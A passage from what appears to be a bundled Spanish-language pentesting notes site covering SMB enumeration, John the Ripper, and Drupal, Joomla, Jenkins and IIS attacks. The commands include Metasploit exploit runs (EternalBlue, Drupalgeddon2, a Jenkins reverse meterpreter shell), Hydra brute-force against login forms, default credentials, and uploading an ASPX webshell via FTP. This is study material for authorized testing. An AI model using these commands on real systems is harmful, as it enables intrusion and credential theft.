*.rdp  *.pem  *.key  *.kdbx
\`\`\`

Palabras clave a buscar dentro de los archivos:

\`\`\`text
password  passwd  pwd
username  user
credential  secret  token  apikey
connectionstring
\`\`\`

Qué tipo de hallazgos priorizar: **backups**, **ficheros de configuración**, **credenciales**, **scripts** (que a veces contienen contraseñas en claro), **claves** (\`.pem\`, \`.key\`, \`.kdbx\`) e **información sensible** en documentos.

* **Después**: toda credencial encontrada se prueba (de forma autorizada) como **reutilización de credenciales** en los servicios que tengas enumerados.

***

## Enumeración de usuarios (SID / RID)

Objetivo: obtener una lista de **usuarios** (locales y/o de dominio) y sus **RID**.

Conceptos:

* **SID**: identificador único de un dominio/equipo (p. ej. \`S-1-5-21-...\`).
* **RID**: parte final del SID que identifica a la cuenta. Referencia: \`500\` = Administrador integrado, \`501\` = Guest, \`502\` = krbtgt (dominio), **\`1000+\`** = cuentas creadas.

Con \`rpcclient\`:

\`\`\`bash
rpcclient -U "" -N <ip>
enumdomusers      # Enumerar usuarios del dominio/equipo
lsaenumsid        # Obtener SIDs conocidos
lookupnames <usuario>   # Resolver nombre → SID
lookupsids <SID>        # Resolver SID → nombre
\`\`\`

Con Metasploit (RID cycling / SID enumeration):

\`\`\`bash
msfconsole -q
use auxiliary/scanner/smb/smb_lookupsid
set RHOSTS <ip>
run
\`\`\`

Con Impacket (\`lookupsid.py\`):

\`\`\`bash
lookupsid.py <dominio>/<usuario>:<contraseña>@<ip>
# También admite hash:  lookupsid.py <dominio>/<usuario>@<ip> -hashes <LM>:<NT>
\`\`\`

\`lookupsid.py\` necesita: **dominio**, **usuario**, **contraseña o hash** y la **IP** objetivo. En el resultado busca los **RID**:

* \`500\` → cuenta Administrador integrada.
* \`501\` → Guest.
* \`1000+\` → cuentas de usuario reales creadas → candidatas para correlación y pruebas de credenciales autorizadas.

> El objetivo aquí es **enumeración**. La explotación de tickets/credenciales (Kerberoasting, Pass-the-Hash, etc.) pertenece a fases posteriores y a otras secciones.

***

## enum4linux

Herramienta "wrapper" que combina utilidades de Samba para enumerar SMB de forma amplia.

\`\`\`bash
enum4linux -a <ip>                    # Enumeración completa
enum4linux -U <ip>                    # Solo usuarios
enum4linux -a -u "" -p "" <ip>        # Null session explícita
enum4linux -u '<usuario>' -p '<contraseña>' -a <ip>   # Autenticada
\`\`\`

Puede obtener: **dominio/workgroup**, **usuarios**, **grupos**, **shares**, **política de contraseñas**, **información del SO**, **rango de RID**, **información NBT**, **sesiones** e **información de SID**.

No te limites a ejecutarlo: **interpreta la salida en orden**:

1. **Target Information** → nombre, dominio/workgroup, SO.
2. **NBT / NetBIOS** → nombres y sufijos.
3. **Session Check** → ¿se permite sesión (anónima)?
4. **Domain SID** → SID base del dominio/equipo.
5. **Users** → lista de usuarios y RIDs.
6. **Share Enumeration** → recursos y accesibilidad.
7. **Password Policy** → política de contraseñas (ver siguiente sección).

***

## Grupos y enumeración de dominio

\`\`\`bash
rpcclient -U "" -N <ip>
querydominfo      # Información del dominio (nombre, nº de usuarios, políticas)
enumdomgroups     # Grupos del dominio
querygroup <RID>  # Detalle de un grupo
getdompwinfo      # Información de política de contraseñas vía RPC
\`\`\`

Con credenciales también sirven \`crackmapexec smb <ip> -u '<usuario>' -p '<contraseña>' --users\` y \`--groups\`, y \`enum4linux -a\`.

* **Qué buscar**: grupos privilegiados (p. ej. *Domain Admins*), pertenencia de usuarios, nombre y SID del dominio.
* **Después**: alimenta la correlación con AD/BloodHound.

***

## Política de contraseñas

Enumerar la política de contraseñas **antes** de cualquier prueba de autenticación es clave: define qué es seguro intentar.

\`\`\`bash
crackmapexec smb <ip> -u '<usuario>' -p '<contraseña>' --pass-pol
rpcclient -U "" -N <ip> -c "getdompwinfo"
enum4linux -P <ip>
\`\`\`

Información que puedes obtener:

* Longitud mínima de contraseña.
* Complejidad requerida.
* Historial de contraseñas.
* Edad máxima / mínima de la contraseña.
* **Umbral de bloqueo de cuenta (lockout threshold)**.
* Duración del bloqueo.
* Cierre de sesión forzado.

Por qué cambia la estrategia:

* **Si existe lockout** → mucho cuidado con password spraying / fuerza bruta: puedes **bloquear cuentas**. Ajusta el ritmo o evítalo.
* **Si no existe lockout** → hay más margen para pruebas de autenticación **autorizadas**, siempre dentro del alcance del test.

> Esta sección no es una guía de fuerza bruta: es para **decidir con criterio** si las pruebas de autenticación son seguras y autorizadas. Herramientas de bruteforce existentes (CME, Hydra) solo se usan dentro del alcance permitido y teniendo en cuenta el lockout.

Referencia de fuerza bruta (solo en entornos autorizados y respetando la política de bloqueo):

\`\`\`bash
crackmapexec smb <ip> -u <wordlist_usuarios.txt> -p '<contraseña>' --continue-on-success
hydra -L <usuarios.txt> -P <passwords.txt> smb://<ip>
\`\`\`

***

## Enumeración de vulnerabilidades SMB

Detectar **no** es explotar. El flujo correcto es: **1)** detectar → **2)** correlacionar con SO/versión → **3)** validar → **4)** determinar si es realmente explotable y está autorizado.

\`\`\`bash
nmap --script "smb-vuln*" -p139,445 <ip>   # Todos los scripts de vulnerabilidades SMB
nmap --script smb-vuln-ms17-010 -p445 <ip> # Comprobación específica de MS17-010
\`\`\`

Ejemplos históricos que estos scripts cubren: **MS08-067**, **MS17-010 (EternalBlue)**, **Conficker**, **MS06-025**, **MS07-029**, entre otros.

> **No asumas relevancia.** Estas vulnerabilidades son **antiguas** y **no** aplican automáticamente a un Windows moderno. Que un script las marque como *likely vulnerable* requiere **validación**; que **no** las marque no garantiza que sea seguro.

### SMBv1 y MS17-010 (EternalBlue)

* **SMBv1 presente ≠ explotable.** Es una señal; hay que comprobar la versión exacta y el estado de parches.
* **445 abierto ≠ MS17-010 vulnerable.** La exposición del puerto no dice nada sobre el parche.
* Valida siempre con el script específico y correlaciona con el SO antes de intentar nada.

Si (y solo si) está confirmado y autorizado, el módulo clásico de explotación es:

\`\`\`bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <ip>
set LHOST <tu_ip>
set LPORT 4444
exploit
\`\`\`

Otras asociadas a SMB a tener en el radar (siempre validando versión/parche): **SMBGhost (CVE-2020-0796)** en SMBv3.1.1, **SMBleed**, **PetitPotam** (coerción NTLM).

***

## RPC (135)

El puerto **135 (DCE/RPC)** no es SMB, pero acompaña a los servicios Windows y aporta enumeración adicional.

\`\`\`bash
nmap -p135 --script rpcinfo <ip>     # Identificar servicios RPC expuestos
\`\`\`

Con Metasploit (endpoint mapper):

\`\`\`bash
msfconsole -q
use auxiliary/scanner/dcerpc/endpoint_mapper
set RHOSTS <ip>
run
\`\`\`

> Exploits antiguos de RPC/DCOM (p. ej. **MS03-026**, \`exploit/windows/dcerpc/ms03_026_dcom\`) existen en documentación clásica, pero aplican solo a sistemas muy desactualizados. Trátalos como **legado**: detectar → validar versión/parche → confirmar que es explotable y autorizado antes de usarlos.

***

## Flujo de trabajo (workflow)

\`\`\`text
445/139 detectado
      ↓
Identificar host (NetBIOS / smb-os-discovery)
      ↓
Identificar dominio / workgroup
      ↓
Enumerar recursos compartidos (shares)
      ↓
Probar null session / acceso anónimo
      ↓
Determinar permisos (READ / WRITE / NO ACCESS)
      ↓
Enumerar archivos  →  buscar credenciales / información sensible
      ↓
Enumerar usuarios (SID / RID)
      ↓
Enumerar grupos y política de contraseñas
      ↓
Comprobar vulnerabilidades (validar, no asumir)
      ↓
Correlacionar con DNS / LDAP / Kerberos / AD
      ↓
Elegir el siguiente vector (autorizado)
\`\`\`

***

## Árbol de decisión

\`\`\`text
¿139 / 445 abierto?
   └─ Sí → obtener hostname (NetBIOS / smb-os-discovery)
             │
             ├─ ¿Dominio encontrado?
             │     ├─ Sí → correlacionar: DNS · LDAP · Kerberos · AD
             │     └─ No → workgroup / enumeración local
             │
             └─ Enumerar shares
                   │
                   ├─ ¿Acceso anónimo / null session?
                   │     ├─ Sí → enumerar shares y archivos
                   │     └─ No → conseguir credenciales y reenumerar
                   │
                   ├─ ¿READ?  → descargar y analizar archivos
                   ├─ ¿WRITE? → investigar uso del recurso (sin asumir RCE)
                   │
                   ├─ ¿Credenciales encontradas? → probar reutilización (autorizada)
                   ├─ ¿Usuarios? → SID/RID → estrategia de autenticación
                   └─ ¿Vulnerabilidad detectada? → validar versión/parche
\`\`\`

***

## "Encontré X → ¿qué hago ahora?"

| Hallazgo | Siguiente paso |
|---|---|
| **445 abierto** | Empezar enumeración SMB (host → dominio → shares). |
| **Hostname** | Correlacionar con DNS / registros del entorno. |
| **Dominio** | Pasar a enumeración de **LDAP / Kerberos / AD** (confirmar antes el DC). |
| **Un share** | Determinar permisos (READ/WRITE/NO ACCESS). |
| **READ** | Enumerar y descargar archivos; buscar credenciales e info sensible. |
| **WRITE** | Investigar cómo se usa el recurso (no asumir ejecución). |
| **Usuarios** | Enumerar SID/RID y correlacionar con AD. |
| **Credenciales** | Probar **reutilización** en servicios autorizados; reenumerar SMB autenticado. |
| **SMBv1** | Comprobar versión/parche y vulnerabilidades asociadas. |
| **MS17-010 (marcado)** | **Validar** versión y parche antes de intentar explotación. |

***

## Referencia rápida de comandos

| Objetivo | Comando |
|---|---|
| NetBIOS (tabla de nombres) | \`nmblookup -A <ip>\` |
| NetBIOS (scan) | \`nbtscan <ip>\` |
| NetBIOS (NSE) | \`nmap --script nbstat.nse -p137 <ip>\` |
| OS discovery | \`nmap --script smb-os-discovery -p139,445 <ip>\` |
| Dialectos SMB | \`nmap -p139,445 --script smb-protocols <ip>\` |
| Firma SMB | \`nmap -p139,445 --script smb-security-mode <ip>\` |
| Listar shares (null) | \`smbclient -L //<ip> -N\` |
| Shares + permisos | \`smbmap -H <ip>\` |
| Shares (NSE) | \`nmap --script smb-enum-shares -p139,445 <ip>\` |
| Conectar a un share | \`smbclient //<ip>/<recurso> -N\` |
| Enum completa | \`enum4linux -a <ip>\` |
| RPC (null) | \`rpcclient -U "" -N <ip>\` |
| Shares (CME/NXC) | \`crackmapexec smb <ip> -u '<usuario>' -p '<contraseña>' --shares\` |
| SMBMap autenticado | \`smbmap -H <ip> -u '<usuario>' -p '<contraseña>'\` |
| SID/RID (Impacket) | \`lookupsid.py <dominio>/<usuario>:<contraseña>@<ip>\` |
| SID/RID (Metasploit) | \`use auxiliary/scanner/smb/smb_lookupsid\` |
| Política de contraseñas | \`crackmapexec smb <ip> -u '<usuario>' -p '<contraseña>' --pass-pol\` |
| Vulnerabilidades SMB | \`nmap --script "smb-vuln*" -p139,445 <ip>\` |

***

## Checklist

### Recon
- [ ] 139/tcp
- [ ] 445/tcp
- [ ] Hostname
- [ ] NetBIOS
- [ ] Workgroup
- [ ] Dominio
- [ ] FQDN
- [ ] SO
- [ ] Hora del sistema

### Shares
- [ ] Acceso anónimo
- [ ] Null session
- [ ] Acceso Guest
- [ ] smbclient
- [ ] smbmap
- [ ] smb-enum-shares
- [ ] enum4linux
- [ ] rpcclient
- [ ] CME / NXC
- [ ] Permiso READ
- [ ] Permiso WRITE

### Archivos
- [ ] Backups
- [ ] Configuraciones
- [ ] Credenciales
- [ ] Scripts
- [ ] Claves (.pem/.key/.kdbx)
- [ ] Tokens
- [ ] Documentos sensibles

### Usuarios
- [ ] SID
- [ ] RID
- [ ] Usuarios locales
- [ ] Usuarios de dominio
- [ ] Grupos

### Seguridad
- [ ] Política de contraseñas
- [ ] SMBv1
- [ ] Vulnerabilidades SMB
- [ ] MS17-010 (validado)
- [ ] Otros checks NSE relevantes

### Correlación
- [ ] DNS
- [ ] LDAP
- [ ] Kerberos
- [ ] Active Directory
- [ ] Reutilización de credenciales

***

> Esta página cubre **enumeración SMB**. Las técnicas de **SMB Relay, NTLM Relay, Pass-the-Hash, movimiento lateral, PsExec, WMI, WinRM** y ataques de **Active Directory** se tratan como fases posteriores y se documentarán en sus propias secciones.
`,yi=`Este apartado funciona como un repositorio de guías rápidas, hojas de trucos (cheatsheets) y metodologías de uso para herramientas específicas de ciberseguridad. El objetivo es centralizar el conocimiento sobre el funcionamiento técnico de utilidades esenciales para el pentesting.

---

## Herramientas Documentadas

| Herramienta | Función Principal | Documentación |
| :--- | :--- | :--- |
| **John the Ripper** | Cracking de contraseñas y análisis de hashes de forma local. | [Ver Notas](/pentesting/tools/john-the-ripper) |
| **Windows Hotfix** | Gestión, análisis y despliegue de parches de seguridad en entornos Windows. | [Ver Notas](/pentesting/tools/windows-hotfix) |

---

## Objetivos de esta Sección

* **Optimización de Ataques:** Aprender a configurar diccionarios (\`wordlists\`) y reglas de mutación de forma eficiente.
* **Análisis de Parches:** Entender la importancia de los hotfixes en la seguridad de sistemas operativos y cómo auditar su presencia.
* **Automatización:** Crear flujos de trabajo que permitan integrar estas herramientas en auditorías reales.

---

## Comunidad y Contenido
Puedes seguir mi progreso y contenido adicional en:

* **YouTube**  [bitsofalber](https://www.youtube.com/@bitsofalber)
* **Instagram**  [@bitsofalber](https://www.instagram.com/bitsofalber/)
* **LinkedIn**  [ahidalgotech](https://linkedin.com/in/ahidalgotech)

---
`,bi=`## John the Ripper: Descifrado de Hashes y Claves Privadas

John the Ripper es una de las herramientas más poderosas para la recuperación de contraseñas mediante ataques de fuerza bruta y diccionario. Es ampliamente utilizada en auditorías de seguridad y pruebas de penetración para descifrar **hashes de contraseñas**, **claves privadas SSH (id\\_rsa)** y diversos formatos de cifrado.

En esta guía, exploraremos su uso en diferentes escenarios.

### Modos Principales de John the Ripper

 **Ataque de diccionario:** Utiliza un archivo de palabras clave para probar contraseñas comunes.\\
 **Ataque de fuerza bruta:** Prueba todas las combinaciones posibles dentro de un rango determinado.\\
 **Descifrado de claves privadas SSH:** Extrae contraseñas de archivos **id\\_rsa** cifrados.\\
 **Soporte para múltiples formatos:** Compatible con hashes **MD5, SHA-256, NTLM, bcrypt, entre otros**.

***

### Ejemplos de Uso

### Descifrar Hashes de Contraseñas

John the Ripper admite una amplia variedad de hashes. Para descifrar un hash almacenado en un archivo:

\`\`\`bash
john --show hashes.txt # Para verificar el formato del hash antes de iniciar el ataque.
john --wordlist=/usr/share/wordlists/rockyou.txt <hash.txt>
\`\`\`

### Fuerza Bruta en Hashes

Si no se cuenta con un diccionario adecuado, se puede utilizar un ataque de fuerza bruta:

\`\`\`bash
john --incremental hashes.txt # Esto probará todas las combinaciones posibles de caracteres hasta encontrar la contraseña.
john –format=descrypt –wordlist /usr/share/wordlists/rockyou.txt <hash.txt>
john –format=descrypt <hash> –show
\`\`\`

### Crackear Diferentes Tipos de Hash

John the Ripper es compatible con múltiples formatos de hash, como:

**MD5:**

\`\`\`bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt <hash.txt>.txt
\`\`\`

 **SHA-256:**

\`\`\`bash
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt <hash.txt>
\`\`\`

 **NTLM (Windows):**

\`\`\`bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt <hash.txt>
\`\`\`

[puerto-22-ssh.md](/pentesting/services/puerto-22-ssh)

#### <mark style="color:yellow;">En el apartado del puerto 22, podremos ver como descifrar una clave id\\_rsa con john\\_the\\_ripper</mark>

### Hay diferentes formas de identificar un hash a continuación os mostraré alguna:

\`\`\`bash
hashid <hash> # Tratar de identificar un hash.
hash-identifier # Y cuando inicie, proporcionarle un hash.
\`\`\`

### Como recurso adicionar podemos utilizar estas webs:

[https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)

[https://md5hashing.net/](https://md5hashing.net/)

<figure><img src="/pentesting/assets/6557477331a283903c6f487d-john-ripper.png" alt=""><figcaption></figcaption></figure>
`,xi=`---
description: >-
  Un hotfix es una actualización de software diseñada para corregir errores
  críticos, fallos de seguridad o problemas urgentes en un sistema sin necesidad
  de esperar una actualización mayor.
---

# HotFixed

 Puede ser que durante el examen veais que hay una pregunta que con mencionan que debeís introducir algún dato relacionado con los HotFixed

## Comandos para encontrar HotFixes en Windows

Existen dos métodos principales para encontrar los HotFixes instalados en un sistema Windows:

### 1. Usando PowerShell

\`\`\`powershell
Get-HotFix # Ver todos los HotFixes instalados
Get-HotFix.count # # Contar el número total de HotFixes
Get-HotFix | Sort-Object -Property InstalledOn -Descending # Ordenar por fecha de instalación
Get-HotFix -Id KB4577586 # Buscar un HotFix específico (ejemplo: KB4577586)
\`\`\`

### 2. Usando WMIC (Windows Management Instrumentation Command-line)

\`\`\`powershell
REM Ver lista de HotFixes en formato tabla
wmic qfe list brief /format:table

REM Ver información detallada
wmic qfe list full
\`\`\`

 Tip: El comando PowerShell es más moderno y ofrece mejor formato de salida, mientras que WMIC es compatible con versiones más antiguas de Windows.
`,Si=`Este módulo se centra en el análisis de vulnerabilidades en aplicaciones web, servidores y gestores de contenido (CMS). La seguridad web es uno de los vectores de ataque más críticos, ya que representa la superficie de exposición más grande de una organización.

---

## Laboratorios de Servicios y CMS

He organizado esta sección por tecnologías para facilitar la consulta de vectores de ataque específicos:

| Tecnología / CMS | Descripción Técnica | Documentación |
| :--- | :--- | :--- |
| **WordPress** | Análisis de plugins, temas y enumeración de usuarios. | [Ver Notas](/pentesting/web/wordpress-cms) |
| **Joomla** | Identificación de versiones y explotación de componentes. | [Ver Notas](/pentesting/web/joomla-cms) |
| **Drupal** | Vectores de ataque conocidos y vulnerabilidades de núcleo. | [Ver Notas](/pentesting/web/drupal-cms) |
| **Jenkins** | Auditoría de consolas de automatización y RCE. | [Ver Notas](/pentesting/web/jenkins) |
| **Tomcat** | Gestión de aplicaciones Java y despliegue de archivos WAR. | [Ver Notas](/pentesting/web/tomcat) |
| **Microsoft IIS** | Implementación y uso de webshells en entornos Windows. | [Ver Notas](/pentesting/web/microsoft-iis-webshell-windows) |
| **Servidor Local** | Despliegue de servidores rápidos para transferencia de archivos. | [Ver Notas](/pentesting/web/servidor-web-local-en-python) |

---

## Objetivos de esta Fase

* **Fingerprinting Avanzado:** Identificar no solo el CMS, sino también sus extensiones y complementos.
* **Explotación de Vulnerabilidades:** Uso de exploits públicos y técnicas de inyección.
* **Carga de Archivos:** Bypass de filtros para subir webshells y ganar ejecución de comandos.
* **Transferencia de Herramientas:** Uso del servidor web local para mover binarios al objetivo.

---

## Comunidad y Contenido
Puedes seguir mi progreso y contenido adicional en:

* **YouTube**  [bitsofalber](https://www.youtube.com/@bitsofalber)
* **Instagram**  [@bitsofalber](https://www.instagram.com/bitsofalber/)
* **LinkedIn**  [ahidalgotech](https://linkedin.com/in/ahidalgotech)

---
`,Ci=`### Identificación de la versión de Drupal y sus componentes.

\`\`\`bash
nmap -sV --script http-drupal-enum <url> # Detección de versión de Drupal y módulos.
nmap -sV --script "http-drupal* and not http-drupal-brute" <url> # Escaneo de vulnerabilidades en Drupal.
nmap -sV --script http-drupal-users <url> # Detección de usuarios de Drupal.
nmap --script=http-drupal-enum --script-args http-drupal-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar si se está utilizando Drupal.
nmap --script=http-vuln* -p 80,443 <url> # Detectar vulnerabilidades específicas en Drupal y sus módulos.
\`\`\`

Antes de realizar cualquier escaneo del CMS Drupal, es recomendable revisar ciertos directorios específicos.

**Check List Drupal:**

* [ ] CHANGELOG.txt

> Si el servicio web no carga correctamente o parece inaccesible, podríamos estar ante un caso de virtual hosting. En ese caso, debemos agregar el dominio correspondiente en nuestro **/etc/hosts**, añadiendo la IP de la web y el dominio al que queremos apuntar, por ejemplo: \`10.0.0.10 drupal.htb\`.

### Escaneo básico Drupal con Metasploit.

\`\`\`bash
use auxiliary/scanner/http/drupal_version # Cargar módulo que vamos a utilizar.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
\`\`\`

### Enumerar Usuarios de Drupal

\`\`\`bash
use auxiliary/scanner/http/drupal_users_enum
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
\`\`\`

### Ataque de fuerza bruta con Metasploit:

\`\`\`bash
set RHOSTS <url>
set USERNAME <nombre_usuario> # Aquí le indicamos el nombre de usuario contra el que queramos atentar.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Seleccionamos el diccionario a utilizar.
run
\`\`\`

>  ¡IMPORTANTE! :&#x20;
>
> El exploit **Drupalgeddon2 (CVE-2018-7600)** afecta a las siguientes versiones de **Drupal**:
>
> * **Drupal 6.x** (todas las versiones)
> * **Drupal 7.x** (todas las versiones antes de **7.58**)
> * **Drupal 8.x** (todas las versiones antes de **8.5.1**).

### Ejecución del exploit Drupalgeddon2 con Metasploit.

_Drupalgeddon2 es una vulnerabilidad crítica (CVE-2018-7600) que permite la ejecución remota de código en versiones vulnerables de Drupal._

\`\`\`bash
use exploit/unix/webapp/drupal_drupalgeddon2 # Seleccionamos el exploit a utilizar.
set RHOSTS <url> # Le indicamos la url del objetivo.
set RPORT 80
set TARGETURI /
run # Iniciamos el ataque.
\`\`\`

Este exploit aprovecha una ejecución arbitraria de código a través de la manipulación de formularios en Drupal.

### Otras herramientas para auditar Drupal.

#### Droopescan

**Droopescan** es una herramienta especializada en la enumeración y auditoría de sitios web basados en **Drupal**. Permite detectar vulnerabilidades, enumerar usuarios, módulos y temas instalados.

\`\`\`bash
droopescan scan drupal -u <url_drupal> # Análisis básico del sitio Drupal.
droopescan scan drupal -u <url_drupal> -e plugins, themes # Enumerar módulos y temas instalados.
\`\`\`

>  Una buena práctica al auditar Drupal es revisar el código fuente de la página web. Ahí podremos encontrar rutas como \`/sites/default/files/\`, que pueden revelar archivos accesibles o permitir _directory listing_, así como información sobre temas y módulos utilizados.

Si encontramos posibles nombres de usuario durante la auditoría, debemos guardarlos en un archivo**.txt** para consultarlos o utilizarlos como **wordlist** de usuarios.

### Fuerza bruta al panel Login de Drupal.

**Fuerza bruta con Hydra**

\`\`\`bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:F=Incorrect username or password."
\`\`\`

Ataque a múltiples usuarios:

\`\`\`bash
hydra -L <lista_usuarios.txt> -P <diccionario.txt> <url> http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:F=Incorrect username or password."
\`\`\`

 Con esta guía hemos cubierto los pasos necesarios para detectar la versión de Drupal, encontrar módulos, temas, directorios sensibles, buscar paneles de login y realizar fuerza bruta contra estos paneles para intentar obtener acceso.

>  _Más adelante, en la parte de Fuzzing Web y descubrimiento de directorios y subdominios, veremos cómo encontrar posibles rutas sensibles que nos faciliten la obtención de información._
`,wi=`## Auditoría de Jenkins – Descubrimiento y Explotación

**Jenkins** es una herramienta de integración continua ampliamente utilizada en entornos de desarrollo y despliegue. Debido a su importancia, es un objetivo común en auditorías de seguridad y pruebas de penetración. En esta guía, exploraremos técnicas para **identificar la versión de Jenkins, enumerar usuarios y rutas sensibles, y explotar vulnerabilidades conocidas**.

***

### Identificación de la Versión de Jenkins

Determinar la versión del servidor es clave para detectar posibles vulnerabilidades. Podemos hacerlo de varias maneras:

**Reconocimiento con Nmap**

\`\`\`bash
nmap -sV --script http-jenkins-enum <url>
\`\`\`

### Reconocimiento con WhatWeb

\`\`\`bash
whatweb -v <url> # Muestra detalles de la versión detectada.
\`\`\`

### Accediendo a la Consola de Jenkins

En muchos casos, la versión de **Jenkins** se puede encontrar directamente en su consola de administración:

\`\`\`bash
http://<ip>:8080
\`\`\`

Si la consola es accesible, la versión suele aparecer en la parte inferior de la interfaz o en la sección "About Jenkins".

> _ Importante: Si el acceso a estos directorios no está restringido, puede representar una vulnerabilidad grave._

### Enumeración de Usuarios en Jenkins

Jenkins almacena credenciales en \`config.xml\` y en otros archivos dentro de \`/var/lib/jenkins\`. Si tenemos acceso, podemos enumerar los usuarios configurados:

\`\`\`bash
cat /var/lib/jenkins/config.xml | grep '<user>'
\`\`\`

Si no tenemos acceso directo, podemos intentar un escaneo con \`Metasploit\`:

\`\`\`bash
use auxiliary/scanner/http/jenkins_enum
set RHOSTS <url>
run
\`\`\`

 Explicación:\\
 \`jenkins_enum\`  Escanea usuarios y configuraciones expuestas en Jenkins.

***

### Ataque de Fuerza Bruta con Hydra

Si encontramos el panel de login de Jenkins, podemos probar credenciales con **Hydra**:

\`\`\`bash
hydra -L <usernames_wordlists.txt> -P <password_wordlist.txt> <url> http-post-form "/j_acegi_security_check: j_username=^USER^&j_password=^PASS^:F=incorrect"
\`\`\`

 Explicación:\\
 \`-L\`  Lista de usuarios.\\
 \`-P\`  Diccionario de contraseñas.\\
 \`http-post-form\`  Método de autenticación de Jenkins.

### Credenciales por defecto de Jenkins:

* admin:admin
* jenkins:jenkins
* admin:password

### Explotación de Jenkins con Metasploit

Si tenemos acceso a la consola de scripts Groovy, podemos ejecutar código malicioso para obtener acceso remoto.

\`\`\`bash
use exploit/multi/http/jenkins_script_console
set RHOSTS <url>
set TARGETURI /script
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 4444
exploit
\`\`\`
`,Ti=`## Joomla - CMS.

### Identificación de la versión de Joomla y sus componentes.

\`\`\`bash
nmap -sV --script http-joomla-enum <url> # Detección de versión de Joomla y extensiones.
nmap -sV --script "http-joomla* and not http-joomla-brute" <url> # Escaneo de vulnerabilidades en Joomla.
nmap -sV --script http-joomla-users <url> # Detección de usuarios de Joomla.
nmap --script=http-joomla-enum --script-args http-joomla-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar si se está utilizando Joomla.
nmap --script=http-vuln* -p 80,443 <url> # Detectar vulnerabilidades específicas en Joomla y sus extensiones.
\`\`\`

>  Si el servicio web no carga correctamente o parece inaccesible, podría haber virtual hosting. En ese caso, debemos agregar el dominio correspondiente en nuestro **/etc/hosts**, por ejemplo: \`10.0.0.10 joomla.htb\`.

### Escaneo básico Joomla con Metasploit.

\`\`\`bash
use auxiliary/scanner/http/joomla_version # Cargar módulo que vamos a utilizar.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
\`\`\`

### Enumerar Usuarios de Joomla

\`\`\`bash
use auxiliary/scanner/http/joomla_users_enum # Cargar módulo que vamos a utilizar.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
\`\`\`

### Ataque de fuerza bruta con Metasploit:

\`\`\`bash
set RHOSTS <url>
set USERNAME <nombre_usuario> # Nombre de usuario objetivo.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Diccionario de contraseñas.
run
\`\`\`

### Ejecución del exploit Joomla CVE-2015-8562 con Metasploit.

> El exploit CVE-2015-8562 permite la ejecución remota de código en versiones vulnerables de Joomla. Y afecta a versiones de **Joomla 1.5 a 3.4.5**.

\`\`\`bash
use exploit/multi/http/joomla_http_header_rce # Seleccionamos el exploit.
set RHOSTS <url> # URL del objetivo.
set RPORT 80
set TARGETURI /
run # Iniciamos el ataque.
\`\`\`

### Otras herramientas para auditar Joomla.

### Joomscan

**Joomscan** es una herramienta especializada en la enumeración y auditoría de sitios web basados en **Joomla**.

\`\`\`bash
joomscan --url <url_joomla> # Análisis básico del sitio Joomla.
joomscan --url <url_joomla> --enumerate-extensions # Enumerar extensiones instaladas.
joomscan --url <url_joomla> --enumerate-users # Enumerar usuarios.
\`\`\`

>  Una buena práctica al auditar Joomla es revisar el código fuente de la página web. Ahí podremos encontrar información sobre plantillas, extensiones utilizadas y posibles rutas sensibles.

Si encontramos posibles nombres de usuario durante la auditoría, debemos guardarlos en un archivo**.txt** para utilizarlos como **wordlist** de usuarios.

### Fuerza bruta al panel Login de Joomla.

**Fuerza bruta con Hydra**

\`\`\`bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login:F=Incorrect username or password."
\`\`\`

 Con esta guía hemos cubierto los pasos necesarios para detectar la versión de Joomla, encontrar extensiones, directorios sensibles, buscar paneles de login y realizar fuerza bruta para intentar obtener acceso.

>  _Más adelante, en la parte de Fuzzing Web y descubrimiento de directorios y subdominios, veremos cómo encontrar posibles rutas sensibles que nos faciliten la obtención de información._
`,Ei=`**¡IMPORTANTE!:**

>  - Si al entrar en el servicio FTP comprobamos que este servicio está vinculado con la web que esté corriendo por el puerto 80 y en el puerto 80 vemos que está corriendo un servicio como **Microsoft II**S o parecido, debemos realizar los siguientes pasos:

## ¿Obtener acceso remoto?

1. En nuestra máquina atacante buscamos: \`find / -name cmdasp.aspx 2>/dev/null\` que normalmente Kali Linux lo almacena en el siguiente directorio: \`/usr/share/webshells/aspx/cmdasp.aspx\`

Una vez tengamos este recurso localizado deberemos **COPIAR** el mismo a nuestro directorio actual, y digo copiar porque si este recurso lo movemos y después lo eliminamos nos quedaremos sin el. Ahora desde nuestro directorio actual donde nos hemos traído el archivo debemos conectarnos nuevamente al servicio **FTP** por el puerto 21 y ahora con el comando **put** subir el archivo.

\`\`\`bash
put cmdasp.aspx # Subir el archivo que nos habiamos copiado a nuestro directorio.
\`\`\`

Una vez tengamos el archivo copiado en el servidor FTP víctima lo que debemos hacer el irnos al navegador, apuntar al host objetivo pero añadiendo **/cmdasp.aspx**

\`\`\`ruby
<host_objetivo>/cmdasp.aspx # Apuntar al host objetivo.
\`\`\`

Y veremos que se no mostrará un campo en el que podremos introducir comandos para ejecutarlos y desde ese momento habremos conseguido un **RCE**.

## ¿Cómo consigo intrusión a nuestra máquina víctima?

Al igual que hemos hecho antes ahora debemos buscar el archivo **nc.exe** que suele estar en este directorio: \`/usr/share/windows-resources/binaries/nc.exe\` debemos realizar la misma operación que antes y copiar este archivo en nuestra máquina atacante a nuestro directorio de trabajo actual.

\`\`\`bash
find / -name nc.exe 2>/dev/null # Buscamos este archivo en nuestra máquina atacante y lo copiamos a nuestro directorio de trabajo actual.
\`\`\`

